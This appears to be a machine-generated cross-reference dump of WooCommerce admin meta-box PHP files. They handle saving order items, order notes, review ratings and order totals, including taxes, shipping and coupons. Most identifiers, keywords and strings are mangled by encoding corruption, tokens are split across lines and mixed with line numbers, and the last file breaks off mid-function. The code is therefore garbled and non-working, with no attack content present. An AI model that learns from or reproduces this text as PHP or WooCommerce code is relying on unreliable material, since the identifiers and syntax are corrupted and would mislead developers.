="add_™em_id" 
şass
="ajax_cho£n_£Ëù_´oduùs_ªd_v¬ŸtiÚs" 
muÉË
="muÉË" 
d©a
-
¶aûhŞd”
="<?ph°_eĞ'S—rch fÜ‡…roduù&h–l;', 'woocomm”û' ); ?>" 
¡yË
="width: 400px"></select>

97 <
bu‰Ú
 
ty³
="bu‰Ú" 
şass
="bu‰Ú‡dd_Üd”_™em"><?
php
 
	`_e
( 'Add item(s)', 'woocommerce' ); ?></button>

98 <
bu‰Ú
 
ty³
="bu‰Ú" 
şass
="bu‰Ú‡dd_Üd”_ãe"><?
php
 
	`_e
( 'Add fee', 'woocommerce' ); ?></button>

99 </
p
>

100 <
div
 
şass
="clear"></div>

101 <?
php


107 
public
 
funùiÚ
 
	$§ve
Ğ
$po¡_id
, 
$po¡
 ) {

108 
glob®
 
$wpdb
;

111 
$subtÙ®
 = 0;

112 
$tÙ®
 = 0;

114 iàĞ
	`is£t
Ğ
$_POST
['order_item_id'] ) ) {

116 
$g‘_v®ues
 = 
	`¬¿y
( 'order_item_id', 'order_item_name', 'order_item_qty', 'line_subtotal', 'line_subtotal_tax', 'line_total', 'line_tax', 'order_item_tax_class' );

118 
	`fÜ—ch
Ğ
$g‘_v®ues
 
as
 
$v®ue
 )

119 
$$v®ue
 = 
	`is£t
Ğ
$_POST
[ 
$v®ue
 ] ) ? $_POST[ $v®u] : 
	`¬¿y
();

121 
	`fÜ—ch
 ( 
$Üd”_™em_id
 
as
 
$™em_id
 ) {

123 
$™em_id
 = 
	`absšt
( $item_id );

125 iàĞ
	`is£t
Ğ
$Üd”_™em_Çme
[ 
$™em_id
 ] ) )

126 
$wpdb
->
	`upd©e
(

127 
$wpdb
->
´efix
 . "woocommerce_order_items",

128 
	`¬¿y
Ğ'Üd”_™em_Çme' => 
	`wc_ş—n
Ğ
$Üd”_™em_Çme
[ 
$™em_id
 ] ) ),

129 
	`¬¿y
Ğ'Üd”_™em_id' => 
$™em_id
 ),

130 
	`¬¿y
( '%s' ),

131 
	`¬¿y
( '%d' )

134 iàĞ
	`is£t
Ğ
$Üd”_™em_qty
[ 
$™em_id
 ] ) )

135 
	`wc_upd©e_Üd”_™em_m‘a
Ğ
$™em_id
, '_qty', 
	`­¶y_f‹rs
Ğ'woocomm”û_¡ock_amouÁ', 
$Üd”_™em_qty
[ $item_id ] ) );

137 iàĞ
	`is£t
Ğ
$Üd”_™em_x_şass
[ 
$™em_id
 ] ) )

138 
	`wc_upd©e_Üd”_™em_m‘a
Ğ
$™em_id
, '_x_şass', 
	`wc_ş—n
Ğ
$Üd”_™em_x_şass
[ $item_id ] ) );

141 
$lše_tÙ®
[ 
$™em_id
 ] = 
	`is£t
( $line_total[ $item_id ] ) ? $line_total[ $item_id ] : 0;

142 
$lše_x
[ 
$™em_id
 ] = 
	`is£t
( $line_tax[ $item_id ] ) ? $line_tax[ $item_id ] : 0;

143 
$lše_subtÙ®
[ 
$™em_id
 ] = 
	`is£t
Ğ$lše_subtÙ®[ $™em_id ] ) ? $lše_subtÙ®[ $™em_id ] : 
$lše_tÙ®
[ $item_id ];

144 
$lše_subtÙ®_x
[ 
$™em_id
 ] = 
	`is£t
Ğ$lše_subtÙ®_x[ $™em_id ] ) ? $lše_subtÙ®_x[ $™em_id ] : 
$lše_x
[ $item_id ];

147 
	`wc_upd©e_Üd”_™em_m‘a
Ğ
$™em_id
, '_lše_subtÙ®', 
	`wc_fÜm©_decim®
Ğ
$lše_subtÙ®
[ $item_id ] ) );

148 
	`wc_upd©e_Üd”_™em_m‘a
Ğ
$™em_id
, '_lše_subtÙ®_x', 
	`wc_fÜm©_decim®
Ğ
$lše_subtÙ®_x
[ $item_id ] ) );

149 
	`wc_upd©e_Üd”_™em_m‘a
Ğ
$™em_id
, '_lše_tÙ®', 
	`wc_fÜm©_decim®
Ğ
$lše_tÙ®
[ $item_id ] ) );

150 
	`wc_upd©e_Üd”_™em_m‘a
Ğ
$™em_id
, '_lše_x', 
	`wc_fÜm©_decim®
Ğ
$lše_x
[ $item_id ] ) );

153 
$subtÙ®
 +ğ
	`wc_fÜm©_decim®
Ğ
$lše_subtÙ®
[ 
$™em_id
 ] );

154 
$tÙ®
 +ğ
	`wc_fÜm©_decim®
Ğ
$lše_tÙ®
[ 
$™em_id
 ] );

157 
	`wp_ÿche_d–‘e
Ğ
$™em_id
, 'order_item_meta' );

162 
$m‘a_keys
 = 
	`is£t
Ğ
$_POST
['m‘a_key'] ) ? $_POST['m‘a_key'] : 
	`¬¿y
();

163 
$m‘a_v®ues
 = 
	`is£t
Ğ
$_POST
['m‘a_v®ue'] ) ? $_POST['m‘a_v®ue'] : 
	`¬¿y
();

165 
	`fÜ—ch
 ( 
$m‘a_keys
 
as
 
$id
 => 
$m‘a_key
 ) {

166 
$m‘a_v®ue
 = ( 
	`em±y
Ğ
$m‘a_v®ues
[ 
$id
 ] ) && ! 
	`is_num”ic
( $meta_values[ $id ] ) ) ? '' : $meta_values[ $id ];

167 
$m‘a_v®ue
 = 
	`¡r¦ashes
( $meta_value );

168 
$wpdb
->
	`upd©e
(

169 
$wpdb
->
´efix
 . "woocommerce_order_itemmeta",

170 
	`¬¿y
(

171 'm‘a_key' => 
$m‘a_key
,

172 'm‘a_v®ue' => 
$m‘a_v®ue


174 
	`¬¿y
Ğ'm‘a_id' => 
$id
 ),

175 
	`¬¿y
( '%s', '%s' ),

176 
	`¬¿y
( '%d' )

181 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_ÿ¹_discouÁ', 
$subtÙ®
 - 
$tÙ®
 );

182 
	}
}

	@includes/admin/post-types/meta-boxes/class-wc-meta-box-order-notes.php

1 <?
php


11 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

16 şas 
	cWC_M‘a_Box_Ord”_NÙes
 {

21 
public
 
funùiÚ
 
	$ouut
Ğ
$po¡
 ) {

22 
glob®
 
$woocomm”û
, 
$po¡
;

24 
$¬gs
 = 
	`¬¿y
(

25 'po¡_id' => 
$po¡
->
ID
,

30 
	`»move_f‹r
Ğ'comm’ts_şau£s', 
	`¬¿y
( 'WC_Comments', 'exclude_order_comments' ), 10, 1 );

32 
$nÙes
 = 
	`g‘_comm’ts
Ğ
$¬gs
 );

34 
	`add_f‹r
Ğ'comm’ts_şau£s', 
	`¬¿y
( 'WC_Comments', 'exclude_order_comments' ), 10, 1 );

36 
echo
 '<ul class="order_notes">';

38 iàĞ
$nÙes
 ) {

39 
	`fÜ—ch
Ğ
$nÙes
 
as
 
$nÙe
 ) {

40 
$nÙe_şas£s
 = 
	`g‘_comm’t_m‘a
Ğ
$nÙe
->
comm’t_ID
, 'is_cu¡om”_nÙe', 
Œue
 ) ? 
	`¬¿y
( 'customer-note', 'note' ) :‡rray( 'note' );

43 <
li
 
»l
="<?ph°echØabsštĞ$nÙe->comm’t_ID ) ; ?>" 
şass
="<?phpƒcho implode( ' ', $note_classes ); ?>">

44 <
div
 
şass
="note_content">

45 <?
php
 
echo
 
	`w·utİ
Ğ
	`w±exturize
Ğ
	`wp_k£s_po¡
Ğ
$nÙe
->
comm’t_cÚ‹Á
 ) ) ); ?>

46 </
div
>

47 <
p
 
şass
="meta">

48 <
abbr
 
şass
="exaù-d©e" 
t™Ë
="<?ph°echØ$nÙe->comm’t_d©e_gmt; ?> GMT"><?
php
 
	`´štf
Ğ
	`__
Ğ'added % ago', 'woocomm”û' ), 
	`humª_time_diff
Ğ
	`¡¹Ùime
Ğ
$nÙe
->
comm’t_d©e_gmt
 ), 
	`cu¼’t_time
( 'timestamp', 1 ) ) ); ?></abbr>

49 <?
php
 iàĞ
$nÙe
->
comm’t_authÜ
 !=ğ
	`__
Ğ'WooComm”û', 'woocomm”û' ) ) 
	`´štf
( ' ' . __( 'by %s', 'woocommerce' ), $note->comment_author ); ?>

50 <
a
 
h»f
="#" 
şass
="d–‘e_nÙe"><?
php
 
	`_e
( 'Delete‚ote', 'woocommerce' ); ?></a>

51 </
p
>

52 </
li
>

53 <?
php


56 
echo
 '<li>' . 
	`__
( 'There‡re‚o‚otes forhis order yet.', 'woocommerce' ) . '</li>';

59 
echo
 '</ul>';

61 <
div
 
şass
="add_note">

62 <
h4
><?
php
 
	`_e
Ğ'Add‚Ùe', 'woocomm”û' ); ?> <
img
 
şass
="h–p_t" 
d©a
-
t
='<?ph°esc_©Œ_eĞ'
Add
 
a
 
nÙe
 
your
 
»ã»nû
, 
Ü
 
add
‡ 
cu¡om”
 
	`nÙe
 (
the
 
u£r
 
wl
 
be
 
nÙif›d
).', '
woocomm”û
' ); ?>' 
¤c
="<?ph°echØWC()->¶ugš_u¾(); ?>/as£ts/images/h–p.²g" 
height
="16" 
width
="16" /></h4>

63 <
p
>

64 <
‹x»a
 
ty³
="‹xt" 
Çme
="Üd”_nÙe" 
id
="add_Üd”_nÙe" 
şass
="šput-‹xt" 
cŞs
="20" 
rows
="5"></textarea>

65 </
p
>

66 <
p
>

67 <
£Ëù
 
Çme
="Üd”_nÙe_ty³" 
id
="order_note_type">

68 <
İtiÚ
 
v®ue
="cu¡om”"><?
php
 
	`_e
( 'Customer‚ote', 'woocommerce' ); ?></option>

69 <
İtiÚ
 
v®ue
=""><?
php
 
	`_e
( 'Private‚ote', 'woocommerce' ); ?></option>

70 </
£Ëù
>

71 <
a
 
h»f
="#" 
şass
="add_nÙbu‰Ú"><?
php
 
	`_e
( 'Add', 'woocommerce' ); ?></a>

72 </
p
>

73 </
div
>

74 <?
php


76 
	}
}

	@includes/admin/post-types/meta-boxes/class-wc-meta-box-order-reviews.php

1 <?
php


13 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

18 şas 
	cWC_M‘a_Box_Ord”_Rev›ws
 {

23 
public
 
funùiÚ
 
	$ouut
Ğ
$comm’t
 ) {

24 
	`wp_nÚû_f›ld
( 'woocommerce_save_data', 'woocommerce_meta_nonce' );

26 
$cu¼’t
 = 
	`g‘_comm’t_m‘a
Ğ
$comm’t
->
comm’t_ID
, '¿tšg', 
Œue
 );

28 <
£Ëù
 
Çme
="¿tšg" 
id
="rating">

29 <?
php
  
$¿tšg
 = 0; $rating <= 5; $rating++ ) {

30 
echo
 
	`¥rštf
Ğ'<İtiÚ v®ue="%1$s"%2$s>%1$s</İtiÚ>', 
$¿tšg
, 
	`£Ëùed
Ğ
$cu¼’t
, $¿tšg, 
çl£
 ) );

32 </
£Ëù
>

33 <?
php


39 
public
 
funùiÚ
 
	$§ve
Ğ
$loÿtiÚ
, 
$comm’t_id
 ) {

41 iàĞ! 
	`wp_v”ify_nÚû
Ğ
$_POST
['woocomm”û_m‘a_nÚû'], 'woocomm”û_§ve_d©a' ) && ! 
	`is£t
( $_POST['rating'] ) ) {

42  
$loÿtiÚ
;

46 
	`upd©e_comm’t_m‘a
(

47 
$comm’t_id
,

49 
	`štv®
Ğ
$_POST
['rating'] )

53  
$loÿtiÚ
;

54 
	}
}

	@includes/admin/post-types/meta-boxes/class-wc-meta-box-order-totals.php

1 <?
php


13 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

15 şas 
	cWC_M‘a_Box_Ord”_TÙ®s
 {

20 
public
 
funùiÚ
 
	$ouut
() {

21 
glob®
 
$woocomm”û
, 
$theÜd”
, 
$wpdb
, 
$po¡
;

23 iàĞ! 
	`is_objeù
Ğ
$theÜd”
 ) )

24 
$theÜd”
 = 
Ãw
 
	`WC_Ord”
Ğ
$po¡
->
ID
 );

26 
$Üd”
 = 
$theÜd”
;

28 
$d©a
 = 
	`g‘_po¡_m‘a
Ğ
$po¡
->
ID
 );

30 <
div
 
şass
="totals_group">

31 <
h4
><
¥ª
 
şass
="x_tÙ®_di¥Ïy iÆše_tÙ®"></¥ª><?
php
 
	`_e
( 'Shipping', 'woocommerce' ); ?></h4>

33 <
div
 
id
="shpšg_rows" 
şass
="total_rows">

34 <?
php


35 iàĞ
	`WC
()->
	`shpšg
() )

36 
$shpšg_m‘hods
 = 
	`WC
()->
shpšg
->
	`lßd_shpšg_m‘hods
();

38 
	`fÜ—ch
 ( 
$Üd”
->
	`g‘_shpšg_m‘hods
(è
as
 
$™em_id
 => 
$™em
 ) {

39 
$cho£n_m‘hod
 = 
$™em
['method_id'];

40 
$shpšg_t™Ë
 = 
$™em
['name'];

41 
$shpšg_co¡
 = 
$™em
['cost'];

43 
	`šşude
( 'views/html-order-shipping.php' );

47 iàĞ
	`is£t
Ğ
$d©a
['_shipping_method'] ) ) {

48 
$™em_id
 = '';

49 
$cho£n_m‘hod
 = ! 
	`em±y
Ğ
$d©a
['_shipping_method'][0] ) ? $data['_shipping_method'][0] : '';

50 
$shpšg_t™Ë
 = ! 
	`em±y
Ğ
$d©a
['_shipping_method_title'][0] ) ? $data['_shipping_method_title'][0] : '';

51 
$shpšg_co¡
 = ! 
	`em±y
Ğ
$d©a
['_order_shipping'][0] ) ? $data['_order_shipping'][0] : '';

53 
	`šşude
( 'views/html-order-shipping.php' );

56 </
div
>

58 <
h4
><
a
 
h»f
="#" 
şass
="add_tÙ®_row" 
d©a
-
row
="<?php

59 
$™em_id
 = '';

60 
$cho£n_m‘hod
 = '';

61 
$shpšg_co¡
 = '';

62 
$shpšg_t™Ë
 = 
	`__
( 'Shipping', 'woocommerce' );

63 
	`ob_¡¬t
();

64 
	`šşude
( 'views/html-order-shipping.php' );

65 
echo
 
	`esc_©Œ
Ğ
	`ob_g‘_ş—n
() );

66 ?>"><?ph°_eĞ'+ Add shpšg co¡', 'woocomm”û' ); ?> <¥ª cÏss="
ts
" d©a-t="<?
php
 
	`_e
( 'These‡rehe shipping‡nd handling costs forhe order.', 'woocommerce' ); ?>">[?]</span></a></a></h4>

67 <
div
 
şass
="clear"></div>

69 <?
php
 
	`do_aùiÚ
Ğ'woocomm”û_admš_Üd”_tÙ®s_aá”_shpšg', 
$po¡
->
ID
 ) ?>

70 </
div
>

72 <?
php
 iàĞ
	`g‘_İtiÚ
( 'woocommerce_calc_taxes' ) == 'yes' ) : ?>

74 <
div
 
şass
="totals_groupax_rows_group">

75 <
h4
><
¥ª
 
şass
="x_tÙ®_di¥Ïy iÆše_tÙ®"></¥ª><?
php
 
	`_e
( 'Taxes', 'woocommerce' ); ?></h4>

76 <
div
 
id
="x_rows" 
şass
="total_rows">

77 <?
php


78 
glob®
 
$wpdb
;

80 
$¿‹s
 = 
$wpdb
->
	`g‘_»suÉs
( "SELECTax_rate_id,ax_rate_country,ax_rate_state,ax_rate_name,ax_rate_priority FROM {$wpdb->prefix}woocommerce_tax_rates ORDER BYax_rate_name" );

82 
$x_codes
 = 
	`¬¿y
();

84 
	`fÜ—ch
Ğ
$¿‹s
 
as
 
$¿‹
 ) {

85 
$code
 = 
	`¬¿y
();

87 
$code
[] = 
$¿‹
->
x_¿‹_couÁry
;

88 
$code
[] = 
$¿‹
->
x_¿‹_¡©e
;

89 
$code
[] = 
$¿‹
->
x_¿‹_Çme
 ? 
	`§n™ize_t™Ë
( $rate->tax_rate_name ) : 'TAX';

90 
$code
[] = 
	`absšt
Ğ
$¿‹
->
x_¿‹_´iÜ™y
 );

92 
$x_codes
[ 
$¿‹
->
x_¿‹_id
 ] = 
	`¡¹ouµ”
Ğ
	`im¶ode
Ğ'-', 
	`¬¿y_f‹r
Ğ
$code
 ) ) );

95 
	`fÜ—ch
 ( 
$Üd”
->
	`g‘_xes
(è
as
 
$™em_id
 => 
$™em
 ) {

96 
	`šşude
( 'views/html-order-tax.php' );

99 </
div
>

100 <
h4
><
a
 
h»f
="#" 
şass
="add_tÙ®_row" 
d©a
-
row
="<?php

101 
$™em_id
 = '';

102 
$™em
 = '';

103 
	`ob_¡¬t
();

104 
	`šşude
( 'views/html-order-tax.php' );

105 
echo
 
	`esc_©Œ
Ğ
	`ob_g‘_ş—n
() );

106 ?>"><?ph°_eĞ'+ Addax„ow', 'woocomm”û' ); ?> <¥ª cÏss="
ts
" d©a-t="<?
php
 
	`_e
( 'These„ows containaxes forhis order. This‡llows youo display multiple or compoundaxes„atherhan‡ singleotal.', 'woocommerce' ); ?>">[?]</span></a></a></h4>

107 <
div
 
şass
="clear"></div>

108 </
div
>

110 <?
php
 
’dif
; ?>

112 <
div
 
şass
="totals_group">

113 <
h4
><
Ïb–
 ="_Üd”_discouÁ"><?
php
 
	`_e
Ğ'Ord” DiscouÁ', 'woocomm”û' ); ?> <
¥ª
 
şass
="ts" 
d©a
-
t
="<?php _e( 'This isheotal discount‡pplied‡fterax.', 'woocommerce' ); ?>">[?]</span></label></h4>

114 <
šput
 
ty³
="‹xt" 
şass
="wc_šput_´iû" 
id
="_Üd”_discouÁ" 
Çme
="_Üd”_discouÁ" 
¶aûhŞd”
="<?ph°echØwc_fÜm©_loÿlized_´iûĞ0 ); ?>" 
v®ue
="<?php

115 iàĞ
	`is£t
Ğ
$d©a
['_order_discount'][0] ) )

116 
echo
 
	`esc_©Œ
Ğ
	`wc_fÜm©_loÿlized_´iû
Ğ
$d©a
['_order_discount'][0] ) );

118 </
div
>

119 <
div
 
şass
="totals_group">

120 <
h4
><
Ïb–
 ="_Üd”_tÙ®"><?
php
 
	`_e
( 'Order Total', 'woocommerce' ); ?></label></h4>

121 <
šput
 
ty³
="‹xt" 
şass
="wc_šput_´iû" 
id
="_Üd”_tÙ®" 
Çme
="_Üd”_tÙ®" 
¶aûhŞd”
="<?ph°echØwc_fÜm©_loÿlized_´iûĞ0 ); ?>" 
v®ue
="<?php

122 iàĞ
	`is£t
Ğ
$d©a
['_order_total'][0] ) )

123 
echo
 
	`esc_©Œ
Ğ
	`wc_fÜm©_loÿlized_´iû
Ğ
$d©a
['_order_total'][0] ) );

125 </
div
>

126 <?
php


127 
$coupÚs
 = 
$Üd”
->
	`g‘_™ems
Ğ
	`¬¿y
( 'coupon' ) );

129 iàĞ
$coupÚs
 ) {

131 <
div
 
şass
="totals_group">

132 <
ul
 
şass
="wc_coupÚ_li¡"><?
php


133 
	`fÜ—ch
 ( 
$coupÚs
 
as
 
$™em_id
 => 
$™em
 ) {

135 
$po¡_id
 = 
$wpdb
->
	`g‘_v¬
Ğ$wpdb->
	`´•¬e
Ğ"SELECT ID FROM {$wpdb->po¡s} WHERE…o¡_t™Ë = % AND…o¡_ty³ = 'shİ_coupÚ' AND…o¡_¡©u ğ'publish' LIMIT 1;", 
$™em
['name'] ) );

137 
$lšk
 = 
$po¡_id
 ? 
	`add_qu”y_¬g
Ğ
	`¬¿y
Ğ'po¡' => $po¡_id, 'aùiÚ' => 'ed™' ), 
	`admš_u¾
Ğ'po¡.php' ) ) :‡dd_qu”y_¬gĞ¬¿yĞ's' => 
$™em
['name'], 'post_status' => 'all', 'post_type' => 'shop_coupon' ),‡dmin_url( 'edit.php' ) );

139 
echo
 '<l˜şass="t code" d©a-t="' . 
	`esc_©Œ
Ğ
	`wc_´iû
Ğ
$™em
['discouÁ_amouÁ'] ) ) . '"><¨h»f="' . 
	`esc_u¾
Ğ
$lšk
 ) . '"><¥ª>' . 
	`esc_html
( $item['name'] ). '</span></a></li>';

141 ?></
ul
>

142 </
div
>

143 <?
php


146 <
p
 
şass
="buttons">

147 <?
php
 iàĞ
	`g‘_İtiÚ
( 'woocommerce_calc_taxes' ) == 'yes' ) : ?>

148 <
bu‰Ú
 
ty³
="bu‰Ú" 
şass
="bu‰Ú c®c_lše_xes"><?
php
 
	`_e
( 'Calculate Tax', 'woocommerce' ); ?></button>

149 <?
php
 
’dif
; ?>

150 <
bu‰Ú
 
ty³
="bu‰Ú" 
şass
="bu‰Ú c®c_tÙ® bu‰Ú-´im¬y"><?
php
 
	`_e
( 'Calculate Total', 'woocommerce' ); ?></button>

151 </
p
>

152 <?
php


158 
public
 
funùiÚ
 
	$§ve
Ğ
$po¡_id
, 
$po¡
 ) {

159 
glob®
 
$wpdb
;

162 
$tÙ®_x
 = 0;

163 
$tÙ®_shpšg_x
 = 0;

165 iàĞ
	`is£t
Ğ
$_POST
['order_taxes_id'] ) ) {

167 
$g‘_v®ues
 = 
	`¬¿y
( 'order_taxes_id', 'order_taxes_rate_id', 'order_taxes_amount', 'order_taxes_shipping_amount' );

169 
	`fÜ—ch
Ğ
$g‘_v®ues
 
as
 
$v®ue
 )

170 
$$v®ue
 = 
	`is£t
Ğ
$_POST
[ 
$v®ue
 ] ) ? $_POST[ $v®u] : 
	`¬¿y
();

172 
	`fÜ—ch
Ğ
$Üd”_xes_id
 
as
 
$™em_id
 => 
$v®ue
 ) {

174 iàĞ
$™em_id
 == 'new' ) {

176 
	`fÜ—ch
 ( 
$v®ue
 
as
 
$Ãw_key
 => 
$Ãw_v®ue
 ) {

177 
$¿‹_id
 = 
	`absšt
Ğ
$Üd”_xes_¿‹_id
[ 
$™em_id
 ][ 
$Ãw_key
 ] );

179 iàĞ
$¿‹_id
 ) {

180 
$¿‹
 = 
$wpdb
->
	`g‘_row
Ğ$wpdb->
	`´•¬e
Ğ"SELECT * FROM {$wpdb->´efix}woocomm”û_x_¿‹ WHEREax_¿‹_id = %s", 
$¿‹_id
 ) );

181 
$Ïb–
 = 
$¿‹
->
x_¿‹_Çme
 ? $¿‹->x_¿‹_Çm: 
	`WC
()->
couÁr›s
->
	`x_Ü_v©
();

182 
$compound
 = 
$¿‹
->
x_¿‹_compound
 ? 1 : 0;

184 
$code
 = 
	`¬¿y
();

186 
$code
[] = 
$¿‹
->
x_¿‹_couÁry
;

187 
$code
[] = 
$¿‹
->
x_¿‹_¡©e
;

188 
$code
[] = 
$¿‹
->
x_¿‹_Çme
 ? $rate->tax_rate_name : 'TAX';

189 
$code
[] = 
	`absšt
Ğ
$¿‹
->
x_¿‹_´iÜ™y
 );

190 
$code
 = 
	`¡¹ouµ”
Ğ
	`im¶ode
Ğ'-', 
	`¬¿y_f‹r
( $code ) ) );

192 
$code
 = '';

193 
$Ïb–
 = 
	`WC
()->
couÁr›s
->
	`x_Ü_v©
();

197 
$Ãw_id
 = 
	`wc_add_Üd”_™em
Ğ
$po¡_id
, 
	`¬¿y
(

198 'Üd”_™em_Çme' => 
	`wc_ş—n
Ğ
$code
 ),

203 iàĞ
$Ãw_id
 ) {

204 
	`wc_upd©e_Üd”_™em_m‘a
Ğ
$Ãw_id
, '¿‹_id', 
$¿‹_id
 );

205 
	`wc_upd©e_Üd”_™em_m‘a
Ğ
$Ãw_id
, 'Ïb–', 
$Ïb–
 );

206 
	`wc_upd©e_Üd”_™em_m‘a
Ğ
$Ãw_id
, 'compound', 
$compound
 );

208 iàĞ
	`is£t
Ğ
$Üd”_xes_amouÁ
[ 
$™em_id
 ][ 
$Ãw_key
 ] ) ) {

209 
	`wc_upd©e_Üd”_™em_m‘a
Ğ
$Ãw_id
, 'x_amouÁ', 
	`wc_fÜm©_decim®
Ğ
$Üd”_xes_amouÁ
[ 
$™em_id
 ][ 
$Ãw_key
 ] ) );

211 
$tÙ®_x
 +ğ
	`wc_fÜm©_decim®
Ğ
$Üd”_xes_amouÁ
[ 
$™em_id
 ][ 
$Ãw_key
 ] );

214 iàĞ
	`is£t
Ğ
$Üd”_xes_shpšg_amouÁ
[ 
$™em_id
 ][ 
$Ãw_key
 ] ) ) {

215 
	`wc_upd©e_Üd”_™em_m‘a
Ğ
$Ãw_id
, 'shpšg_x_amouÁ', 
	`wc_fÜm©_decim®
Ğ
$Üd”_xes_shpšg_amouÁ
[ 
$™em_id
 ][ 
$Ãw_key
 ] ) );

217 
$tÙ®_shpšg_x
 +ğ
	`wc_fÜm©_decim®
Ğ
$Üd”_xes_shpšg_amouÁ
[ 
$™em_id
 ][ 
$Ãw_key
 ] );

224 
$™em_id
 = 
	`absšt
( $item_id );

225 
$¿‹_id
 = 
	`absšt
Ğ
$Üd”_xes_¿‹_id
[ 
$™em_id
 ] );

227 iàĞ
$¿‹_id
 ) {

228 
$¿‹
 = 
$wpdb
->
	`g‘_row
Ğ$wpdb->
	`´•¬e
Ğ"SELECT * FROM {$wpdb->´efix}woocomm”û_x_¿‹ WHEREax_¿‹_id = %s", 
$¿‹_id
 ) );

229 
$Ïb–
 = 
$¿‹
->
x_¿‹_Çme
 ? $¿‹->x_¿‹_Çm: 
	`WC
()->
couÁr›s
->
	`x_Ü_v©
();

230 
$compound
 = 
$¿‹
->
x_¿‹_compound
 ? 1 : 0;

232 
$code
 = 
	`¬¿y
();

234 
$code
[] = 
$¿‹
->
x_¿‹_couÁry
;

235 
$code
[] = 
$¿‹
->
x_¿‹_¡©e
;

236 
$code
[] = 
$¿‹
->
x_¿‹_Çme
 ? $rate->tax_rate_name : 'TAX';

237 
$code
[] = 
	`absšt
Ğ
$¿‹
->
x_¿‹_´iÜ™y
 );

238 
$code
 = 
	`¡¹ouµ”
Ğ
	`im¶ode
Ğ'-', 
	`¬¿y_f‹r
( $code ) ) );

240 
$code
 = '';

241 
$Ïb–
 = 
	`WC
()->
couÁr›s
->
	`x_Ü_v©
();

244 
$wpdb
->
	`upd©e
(

245 
$wpdb
->
´efix
 . "woocommerce_order_items",

246 
	`¬¿y
Ğ'Üd”_™em_Çme' => 
	`wc_ş—n
Ğ
$code
 ) ),

247 
	`¬¿y
Ğ'Üd”_™em_id' => 
$™em_id
 ),

248 
	`¬¿y
( '%s' ),

249 
	`¬¿y
( '%d' )

252 
	`wc_upd©e_Üd”_™em_m‘a
Ğ
$™em_id
, '¿‹_id', 
$¿‹_id
 );

253 
	`wc_upd©e_Üd”_™em_m‘a
Ğ
$™em_id
, 'Ïb–', 
$Ïb–
 );

254 
	`wc_upd©e_Üd”_™em_m‘a
Ğ
$™em_id
, 'compound', 
$compound
 );

256 iàĞ
	`is£t
Ğ
$Üd”_xes_amouÁ
[ 
$™em_id
 ] ) ) {

257 
	`wc_upd©e_Üd”_™em_m‘a
Ğ
$™em_id
, 'x_amouÁ', 
	`wc_fÜm©_decim®
Ğ
$Üd”_xes_amouÁ
[ $item_id ] ) );

259 
$tÙ®_x
 +ğ
	`wc_fÜm©_decim®
Ğ
$Üd”_xes_amouÁ
[ 
$™em_id
 ] );

262 iàĞ
	`is£t
Ğ
$Üd”_xes_shpšg_amouÁ
[ 
$™em_id
 ] ) ) {

263 
	`wc_upd©e_Üd”_™em_m‘a
Ğ
$™em_id
, 'shpšg_x_amouÁ', 
	`wc_fÜm©_decim®
Ğ
$Üd”_xes_shpšg_amouÁ
[ $item_id ] ) );

265 
$tÙ®_shpšg_x
 +ğ
	`wc_fÜm©_decim®
Ğ
$Üd”_xes_shpšg_amouÁ
[ 
$™em_id
 ] );

272 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_Üd”_x', 
	`wc_fÜm©_decim®
Ğ
$tÙ®_x
 ) );

273 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_Üd”_shpšg_x', 
	`wc_fÜm©_decim®
Ğ
$tÙ®_shpšg_x
 ) );

274 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_Üd”_discouÁ', 
	`wc_fÜm©_decim®
Ğ
$_POST
['_order_discount'] ) );

275 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_Üd”_tÙ®', 
	`wc_fÜm©_decim®
Ğ
$_POST
['_order_total'] ) );

278 
$Üd”_shpšg
 = 0;

280 iàĞ
	`is£t
Ğ
$_POST
['shipping_method_id'] ) ) {

282 
$g‘_v®ues
 = 
	`¬¿y
( 'shipping_method_id', 'shipping_method_title', 'shipping_method', 'shipping_cost' );

284 
	`fÜ—ch
Ğ
$g‘_v®ues
 
as
 
$v®ue
 )

285 
$$v®ue
 = 
	`is£t
Ğ
$_POST
[ 
$v®ue
 ] ) ? $_POST[ $v®u] : 
	`¬¿y
();

287 
	`fÜ—ch
Ğ
$shpšg_m‘hod_id
 
as
 
$™em_id
 => 
$v®ue
 ) {

289 iàĞ
$™em_id
 == 'new' ) {

291 
	`fÜ—ch
 ( 
$v®ue
 
as
 
$Ãw_key
 => 
$Ãw_v®ue
 ) {

292 
$m‘hod_id
 = 
	`wc_ş—n
Ğ
$shpšg_m‘hod
[ 
$™em_id
 ][ 
$Ãw_key
 ] );

293 
$m‘hod_t™Ë
 = 
	`wc_ş—n
Ğ
$shpšg_m‘hod_t™Ë
[ 
$™em_id
 ][ 
$Ãw_key
 ] );

294 
$co¡
 = 
	`wc_fÜm©_decim®
Ğ
$shpšg_co¡
[ 
$™em_id
 ][ 
$Ãw_key
 ] );

296 
$Ãw_id
 = 
	`wc_add_Üd”_™em
Ğ
$po¡_id
, 
	`¬¿y
(

297 'Üd”_™em_Çme' => 
$m‘hod_t™Ë
,

301 iàĞ
$Ãw_id
 ) {

302 
	`wc_add_Üd”_™em_m‘a
Ğ
$Ãw_id
, 'm‘hod_id', 
$m‘hod_id
 );

303 
	`wc_add_Üd”_™em_m‘a
Ğ
$Ãw_id
, 'co¡', 
$co¡
 );

306 
$Üd”_shpšg
 +ğ
$co¡
;

311 
$™em_id
 = 
	`absšt
( $item_id );

312 
$m‘hod_id
 = 
	`wc_ş—n
Ğ
$shpšg_m‘hod
[ 
$™em_id
 ] );

313 
$m‘hod_t™Ë
 = 
	`wc_ş—n
Ğ
$shpšg_m‘hod_t™Ë
[ 
$™em_id
 ] );

314 
$co¡
 = 
	`wc_fÜm©_decim®
Ğ
$shpšg_co¡
[ 
$™em_id
 ] );

316 
$wpdb
->
	`upd©e
(

317 
$wpdb
->
´efix
 . "woocommerce_order_items",

318 
	`¬¿y
Ğ'Üd”_™em_Çme' => 
$m‘hod_t™Ë
 ),

319 
	`¬¿y
Ğ'Üd”_™em_id' => 
$™em_id
 ),

320 
	`¬¿y
( '%s' ),

321 
	`¬¿y
( '%d' )

324 
	`wc_upd©e_Üd”_™em_m‘a
Ğ
$™em_id
, 'm‘hod_id', 
$m‘hod_id
 );

325 
